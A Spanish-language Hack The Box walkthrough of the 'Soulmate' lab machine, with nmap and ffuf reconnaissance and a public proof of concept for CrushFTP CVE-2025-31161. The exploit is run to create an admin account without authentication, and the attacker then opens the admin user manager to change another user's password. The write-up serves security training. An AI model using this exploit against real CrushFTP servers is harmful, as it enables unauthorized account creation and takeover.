# Metodologías de ataque

Creamos nuestra carpeta con el nombre de la maquina `soulmate` y dentro crearemos las subcarpetas para cada fase `content, exploits, nmap, scripts`

Revisamos la conexion a la ip

```bash
ping -c 2 10.10.11.86
```
Respuesta:
<pre>
PING 10.10.11.86 (10.10.11.86) 56(84) bytes of data.
64 bytes from 10.10.11.86: icmp_seq=1 ttl=63 time=139 ms
64 bytes from 10.10.11.86: icmp_seq=2 ttl=63 time=141 ms

--- 10.10.11.86 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 139.407/139.959/140.511/0.552 ms
</pre>

Teniendo la respuesta ingresamos a la ip que nos entrega HTB, en mi caso es la 10.10.11.86

Nos indica que no pudo resolver soulmate.htb

![Ejemplo](assets/1. Ver pagina.png)

Ingresamos al archivo hosts e ingresamos la ip y el dominio que nos indica en la pagina

```bash
sudo nano /etc/hosts
```

<pre>
10.10.11.86 soulmate.hth
</pre>

Recargamos la pagina y deberiamos ya poder ver el inicio:

###INgresar imagen


Realizamos un escaneo en nmap y en paralelo haremos escaneos de directorios y subdominios

## Escaneo previo
**Full TCP (nmap):**
```bash
nmap -vvv -sS -p- --min-rate 1000 -n -Pn 10.10.11.86 -oG nmap/allPorts
```

Respuesta:
<pre>
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-28 13:38 -03
Initiating SYN Stealth Scan at 13:38
Scanning 10.10.11.86 [65535 ports]
Discovered open port 22/tcp on 10.10.11.86
Discovered open port 80/tcp on 10.10.11.86
Increasing send delay for 10.10.11.86 from 0 to 5 due to 382 out of 1272 dropped probes since last increase.
Increasing send delay for 10.10.11.86 from 5 to 10 due to max_successful_tryno increase to 4
Completed SYN Stealth Scan at 13:38, 15.04s elapsed (65535 total ports)
Nmap scan report for 10.10.11.86
Host is up, received user-set (0.26s latency).
Scanned at 2025-09-28 13:38:09 -03 for 15s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
</pre>

Vemos que tenemos 2 puertos, usaremos esos para escanearlos

## Escaneo de servicios
**Servicios + scripts:**
```bash
nmap -v -sC -sV --min-rate 1000 -p 22,80 -n 10.10.11.86 -oG nmap/targeted
```

<pre>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

## Fuzzing de directorios web
```bash
ffuf -w /usr/share/wordlists/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://soulmate.htb/FUZZ -o content/dirs-soulmate.json -of json -t 25 -fw 6110
```

Respuesta:

<pre>
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 140ms]

</pre>

## Fuzzing de subdominios / vhosts
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" -o content/domains-soulmate.json -of json -t 25
```

Respuesta:

<pre>
ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 228ms]
</pre>

## Fuzzing de archivos

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://soulmate.htb/assets/FUZZ -e .php,.html,.bak,.txt -recursion -recursion-depth 2 -mc 200,301,302 -fc 404 -t 25 -ocontent/extensions-soulmate.jsonn -of json 
```

Respuesta:

<pre>
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 139ms]
[INFO] Adding a new job to the queue: http://soulmate.htb/assets/css/FUZZ

images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 140ms]
[INFO] Adding a new job to the queue: http://soulmate.htb/assets/images/FUZZ

[INFO] Starting queued job on target: http://soulmate.htb/assets/css/FUZZ

[INFO] Starting queued job on target: http://soulmate.htb/assets/images/FUZZ

profiles                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 138ms]
[INFO] Adding a new job to the queue: http://soulmate.htb/assets/images/profiles/FUZZ

[INFO] Starting queued job on target: http://soulmate.htb/assets/images/profiles/FUZZ

:: Progress: [23615/23615] :: Job [4/4] :: 197 req/sec :: Duration: [0:01:36] :: Errors: 0 ::
</pre>

Ingresamos a cada uno de los directorios para verificar algun heartbleed pero no se obtiene nada favorable.

Intentamos acceder al ftp del sitio: ftp.soulmate.htb

#Insertar imagen

Agregamos el ftp al archivo hosts.

```bash
sudo nano /etc/hosts
```

<pre>
10.10.11.86 soulmate.htb ftp.soulmate.htb
</pre>

recargamos la pagina y ya deberiamos tener acceso al ftp

#Insertar imagen

En caso de no cargar probar con la combinacion de teclas Ctrl+F5 para recargar cache.

Dentro de la pagina hacemos una inspeccion de código y verificamos que la version del CrushFTP es la `v11.W.657`

Realizamos una busqueda en google y validamos la vulnerabilidad: "11.W.657 CRUSHFTP Vuln"

y encontramos el CVE de la vulnerabilidad: CVE-2025-31161

Fuente: https://s2grupo.es/vulnerabilidades-crushftp-2025/

Realizamos otra busqueda en google con la CVE: CVE-2025-31161 y vemos que en github hay una POC en python para usarse

#Insertar imagen

Descargamos la POC y la ejecutamos:

```bash
cd exploits
git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161.git
python3 cve-2025-31161.py
```
Respuesta:

<pre>
[-] Target host not specified
usage: cve-2025-31161.py [-h] [--target_host TARGET_HOST] [--port PORT] [--target_user TARGET_USER] [--new_user NEW_USER] [--password PASSWORD]

Exploit CVE-2025-31161 to create a new account

options:
  -h, --help            show this help message and exit
  --target_host TARGET_HOST
                        Target host
  --port PORT           Target port
  --target_user TARGET_USER
                        Target user
  --new_user NEW_USER   New user to create
  --password PASSWORD   Password for the new user

</pre>

Nos pide ingresar los datos en este orden (probaremos con el usuario root que es el mas común):

```bash
python3 --target_host http://ftp.soulmate.htb --port 80 --target_user root --new_user prueba --password admin123
```

Respuesta:

<pre>
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
<strong>[+] Exploit Complete you can now login with
   [*] Username: prueba
   [*] Password: admin123.</strong>
</pre>

Tenemos el usuario creado, ahora validamos el acceso:

#Insertar imagen

Empezamos a navegar en el portal y lo primero que vemos es la opcion de Admin, dentro de esta opcion navegamos por el menu hasta que llegamos a la parte de User Manager. Donde podemos ver los usuarios registrados hasta el momento.

Probaremos con el primer usuario a ver si le podemos cambiar la password y presionamos en Save:

#Insertar imagen


> **Recordatorio:** documentar comandos, salidas y autorización es obligatorio. Uso exclusivo en entornos autorizados.
